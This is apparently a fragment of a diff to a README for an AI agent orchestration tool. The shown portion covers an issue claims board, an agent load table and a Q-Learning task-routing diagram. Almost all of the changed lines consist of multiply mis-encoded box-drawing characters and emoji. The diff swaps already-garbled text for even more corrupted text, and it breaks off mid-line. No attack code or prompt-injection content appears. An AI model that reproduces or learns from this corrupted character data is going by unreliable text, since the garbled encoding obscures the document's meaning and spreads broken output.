Ã‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                        CLAIMS BOARD                                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   UNCLAIMED   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ACTIVE     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   STEALABLE   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡     COMPLETED       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¼ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¼ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¼ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #127 Add auth ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #123 Fix bug  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #120 Refactor ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #119 Update docs    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #128 Tests    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   (coder-1)   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   (stale 2h)  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #118 Security fix   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡               ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #124 API work ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡               ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ #117 Performance    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡               ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   (reviewer)  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡               ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â´ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â´ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â´ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Handoff Workflow
@@ -4322,10 +4322,10 @@ npx ruflo@latest issues load
 # Output:
 # Agent          | Claims | Load  | Status
 # ---------------+--------+-------+--------
-# coder-1        | 3      | 85%   | Ã°Å¸â€Â´ Overloaded
-# coder-2        | 1      | 25%   | Ã°Å¸Å¸Â¢ Available
-# reviewer       | 2      | 50%   | Ã°Å¸Å¸Â¡ Normal
-# security-arch  | 0      | 0%    | Ã°Å¸Å¸Â¢ Available
+# coder-1        | 3      | 85%   | ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â´ Overloaded
+# coder-2        | 1      | 25%   | ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â¢ Available
+# reviewer       | 2      | 50%   | ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â¡ Normal
+# security-arch  | 0      | 0%    | ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â¢ Available
 
 # Auto-rebalance
 npx ruflo@latest issues rebalance
@@ -4352,37 +4352,37 @@ npx ruflo@latest issues rebalance
 ---
 
 <details>
-<summary>Ã°Å¸Â§Â­ <strong>Intelligent Routing</strong> Ã¢â‚¬â€ Q-Learning Task Assignment</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â­ <strong>Intelligent Routing</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Q-Learning Task Assignment</summary>
 
 The Route system uses **Q-Learning** to automatically assign tasks to the best agent based on learned performance patterns.
 
 ### How Routing Works
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                     INTELLIGENT ROUTING                             Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€š  Task: "Fix authentication bug"                                     Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€â€š                                                         Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€“Â¼                                                         Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â                                                Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Analyze Task    Ã¢â€â€š Ã¢â€ Â Complexity, domain, keywords                 Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ                                                Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€â€š                                                         Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€“Â¼                                                         Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â                                                Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Q-Learning      Ã¢â€â€š Ã¢â€ Â Historical success rates per agent           Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Lookup          Ã¢â€â€š                                                Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ                                                Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€â€š                                                         Ã¢â€â€š
-Ã¢â€â€š           Ã¢â€“Â¼                                                         Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â                                                Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š Recommend:      Ã¢â€â€š                                                Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€š security-arch   Ã¢â€â€š Ã¢â€ â€™ 94% confidence (auth domain expert)          Ã¢â€â€š
-Ã¢â€â€š  Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ                                                Ã¢â€â€š
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ